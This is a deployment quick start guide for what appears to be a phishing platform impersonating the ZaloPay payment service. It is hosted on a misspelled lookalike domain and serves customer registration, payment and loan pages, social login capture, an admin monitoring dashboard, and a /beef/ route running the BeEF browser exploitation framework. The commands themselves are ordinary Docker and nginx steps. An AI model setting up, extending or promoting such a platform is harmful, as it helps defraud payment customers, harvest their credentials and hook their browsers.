# ZaloPay Merchant Platform - Quick Start Guide

## 🚀 Quick Start (5 Minutes)

Get your ZaloPay Merchant Platform up and running in 5 minutes.

### Prerequisites

- Linux server with Docker and Docker Compose installed
- Domain `zalopaymerchan.com` pointing to server IP `221.120.163.129`
- Ports 80 and 443 open in firewall

### Step 1: Clone and Setup (1 min)

```bash
# Clone repository
git clone https://github.com/hoanganh-hue/hehe.git
cd hehe

# Setup environment (auto-generates secure credentials)
./scripts/setup_env.sh
```

### Step 2: Configure OAuth (2 min)

Edit `.env` and add your OAuth credentials:

```bash
nano .env
```

Update these lines:
```env
GOOGLE_CLIENT_ID=your_actual_google_client_id
GOOGLE_CLIENT_SECRET=your_actual_google_client_secret
```

> 💡 **Tip**: You can skip OAuth configuration for now and add it later. The platform will work without it.

### Step 3: Deploy (2 min)

```bash
# Build and start all services
docker compose build
docker compose up -d

# Verify deployment
docker compose ps
```

All services should show "Up" status.

### Step 4: Test (30 seconds)

```bash
# Run automated tests
./scripts/test_routing.sh

# Or test manually
curl http://zalopaymerchan.com/
```

### Step 5: Access

Open your browser and visit:

- **Main Portal**: http://zalopaymerchan.com/
- **Merchant Interface**: http://zalopaymerchan.com/merchant/
- **Admin Dashboard**: http://zalopaymerchan.com/admin/

---

## 📋 Architecture Overview

### Routing Structure

```
http://zalopaymerchan.com/
├── /                    → Router/Landing Page (auto-detection)
├── /merchant/           → Customer-facing Interface
├── /admin/              → Management Dashboard
├── /api/                → Backend API (FastAPI)
└── /beef/               → BeEF Framework
```

### How Routing Works

1. **Root Path (`/`)**: Smart router that:
   - Checks for existing user session
   - Auto-redirects based on user role
   - Provides manual portal selection

2. **Merchant Path (`/merchant/`)**: 
   - Customer registration
   - Payment processing
   - Loan applications

3. **Admin Path (`/admin/`)**: 
   - System management
   - User monitoring
   - Analytics dashboard

### Service Architecture

```
┌─────────────────────────────────────────┐
│         Internet (Port 80/443)          │
└──────────────────┬──────────────────────┘
                   │
           ┌───────▼────────┐
           │  Nginx (LB)    │
           │  Load Balancer │
           └───────┬────────┘
                   │
    ┌──────────────┼──────────────┐
    │              │              │
┌───▼────┐    ┌───▼────┐    ┌───▼────┐
│Frontend│    │Backend │    │  BeEF  │
│ Nginx  │    │FastAPI │    │Framework│
└────────┘    └───┬────┘    └────────┘
                  │
    ┌─────────────┼─────────────┐
    │             │             │
┌───▼───┐    ┌───▼───┐    ┌───▼────┐
│MongoDB│    │ Redis │    │InfluxDB│
└───────┘    └───────┘    └────────┘
```

---

## 🔧 Common Tasks

### View Logs

```bash
# All services
docker compose logs -f

# Specific service
docker compose logs -f nginx
docker compose logs -f backend
```

### Restart Services

```bash
# All services
docker compose restart

# Specific service
docker compose restart nginx
```

### Check Service Status

```bash
docker compose ps
```

### Access Container Shell

```bash
# Backend container
docker compose exec backend bash

# Frontend container
docker compose exec frontend sh

# Nginx container
docker compose exec nginx sh
```

### Update Configuration

```bash
# Edit nginx config
nano nginx/conf.d/default.conf

# Test configuration
docker compose exec nginx nginx -t

# Reload nginx
docker compose exec nginx nginx -s reload
```

---

## 🐛 Troubleshooting

### Issue: Cannot Access Website

**Check DNS**:
```bash
dig zalopaymerchan.com +short
# Should return: 221.120.163.129
```

**Check Services**:
```bash
docker compose ps
# All services should be "Up"
```

**Check Firewall**:
```bash
sudo ufw status
# Port 80 and 443 should be allowed
```

### Issue: 502 Bad Gateway

**Check Backend**:
```bash
docker compose logs backend
docker compose restart backend
```

### Issue: Routing Not Working

**Test Nginx Config**:
```bash
docker compose exec nginx nginx -t
```

**Check Frontend Files**:
```bash
docker compose exec frontend ls -la /usr/share/nginx/html/
```

### Issue: Database Connection Errors

**Check Database Services**:
```bash
docker compose ps mongodb-primary redis-primary
docker compose restart mongodb-primary redis-primary
```

---

## 📚 Detailed Documentation

For more detailed information, see:

- **[DEPLOYMENT_GUIDE.md](DEPLOYMENT_GUIDE.md)** - Complete deployment instructions
- **[ROUTING_ARCHITECTURE.md](ROUTING_ARCHITECTURE.md)** - Routing system details
- **[nginx/README.md](nginx/README.md)** - Nginx configuration guide
- **[README.md](README.md)** - Full project documentation

---

## 🔐 Security Considerations

### Generated Credentials

The `setup_env.sh` script automatically generates:
- JWT secret key (64 characters)
- Encryption key (64 characters)
- Database passwords (20 characters)
- BeEF password (16 characters)

All credentials are cryptographically secure random strings.

### File Permissions

```bash
# Secure .env file
chmod 600 .env

# Verify .gitignore includes .env
cat .gitignore | grep .env
```

### Production Deployment

For production with HTTPS:

1. Obtain SSL certificates:
```bash
docker compose --profile production run --rm certbot certonly \
  --webroot --webroot-path=/var/www/certbot \
  --email admin@zalopaymerchan.com \
  --agree-tos -d zalopaymerchan.com
```

2. Enable production nginx config in docker-compose.yml

3. Restart services:
```bash
docker compose restart nginx
```

---

## 📊 Testing

### Automated Testing

```bash
# Full routing test
./scripts/test_routing.sh

# Configuration check
./scripts/configure_deployment.sh
```

### Manual Testing

```bash
# Test root router
curl -I http://zalopaymerchan.com/

# Test merchant interface
curl -I http://zalopaymerchan.com/merchant/

# Test admin interface
curl -I http://zalopaymerchan.com/admin/

# Test API health
curl http://zalopaymerchan.com/api/health

# Test with parameters
curl -L http://zalopaymerchan.com/?route=merchant
curl -L http://zalopaymerchan.com/?route=admin
```

---

## 🎯 What's Next?

After basic deployment:

1. **Configure OAuth** - Add Google, Apple, Facebook credentials
2. **Setup SSL** - Obtain Let's Encrypt certificates
3. **Configure Monitoring** - Setup InfluxDB and logging
4. **Customize UI** - Update merchant and admin interfaces
5. **Setup Backups** - Configure automated backup schedule

---

## 💡 Pro Tips

1. **Use Screen or Tmux**: Keep docker compose running in background
   ```bash
   screen -S zalopay
   docker compose up
   # Press Ctrl+A, D to detach
   ```

2. **Monitor Resources**: Check container resource usage
   ```bash
   docker stats
   ```

3. **Clean Up**: Remove old images and containers
   ```bash
   docker system prune -f
   ```

4. **Backup Regularly**: Create backup script
   ```bash
   # See DEPLOYMENT_GUIDE.md for backup instructions
   ```

---

## 🆘 Getting Help

### Check Logs
```bash
docker compose logs --tail=100 -f
```

### Run Health Check
```bash
./scripts/test_routing.sh
```

### Service Status
```bash
docker compose ps
docker compose top
```

### Network Issues
```bash
docker network ls
docker network inspect hehe_frontend_network
```

---

## 📝 Important Commands Reference

```bash
# Build
docker compose build [service]

# Start
docker compose up -d [service]

# Stop
docker compose down

# Restart
docker compose restart [service]

# Logs
docker compose logs -f [service]

# Execute command
docker compose exec [service] [command]

# Remove everything
docker compose down -v
```

---

## 🎉 Success!

If you can access all three interfaces (root, merchant, admin), you're all set!

**Main URLs**:
- 🏠 http://zalopaymerchan.com/ - Main portal
- 🏪 http://zalopaymerchan.com/merchant/ - Merchant interface  
- 🔐 http://zalopaymerchan.com/admin/ - Admin dashboard

---

**Last Updated**: 2025-10-21  
**Version**: 1.0  
**Domain**: zalopaymerchan.com  
**Server IP**: 221.120.163.129
